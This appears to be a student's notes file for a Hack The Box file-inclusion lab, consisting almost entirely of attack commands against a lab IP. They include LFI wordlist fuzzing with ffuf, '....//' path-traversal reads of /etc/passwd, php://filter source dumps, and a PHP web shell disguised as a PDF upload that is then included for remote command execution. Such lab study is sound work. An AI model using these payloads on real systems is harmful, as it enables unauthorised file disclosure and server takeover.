```text
ffuf -w public/asset/LFI-Jhaddix.txt:FUZZ -u "http://154.57.164.68:31964/api/image.php?p=FUZZ" -fs 0

curl 'http://154.57.164.68:31964/api/image.php?p=....//....//....//etc/passwd'

curl 'http://154.57.164.68:31964/api/image.php?p=....//....//....//....//....//etc/passwd'

curl 'http://154.57.164.68:31964/api/image.php?p=....//....//....//....//etc/passwd&&cmd=ls'

# Work
curl 'http://154.57.164.68:31964/api/image.php?p=php://filter/read=convert.base64-encode/resource=....//....//....//....//....//....//api/image.php'

curl 'http://154.57.164.68:31964/api/image.php?p=php://filter/read=convert.base64-encode/resource=....//....//....//....//....//....//contact.php'


/contact.php?region=%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389%2ephp&cmd=ls+/

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.pdf shell.php

```

## Resources
- https://meetcyber.net/htb-file-inclusion-skills-assessment-from-lfi-to-rce-full-walkthrough-b073fd8a185f
- https://www.youtube.com/watch?v=om1oFWbZ-rg


## Note
<!-- Learn more about it cos not understand it yet -->
- /contact.php?region=%2e%2e%2fuploads%2ffc023fcacb27a7ad72d605c4e300b389%2ephp&cmd=ls+/